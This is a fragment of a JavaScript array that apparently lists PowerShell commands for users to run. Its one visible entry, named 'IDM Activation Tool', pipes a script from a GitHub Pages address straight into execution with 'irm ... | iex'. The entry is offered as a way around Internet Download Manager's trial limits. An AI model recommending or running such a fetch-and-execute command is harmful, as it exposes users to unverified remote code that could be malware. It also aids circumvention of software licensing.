...
const powershellCommands = [
  ...
  { name: 'IDM Activation Tool', command: 'irm https://claususorbis.github.io/haste/amdi.ps1 | iex', description: 'A script to manage the trial period of Internet Download Manager.' },
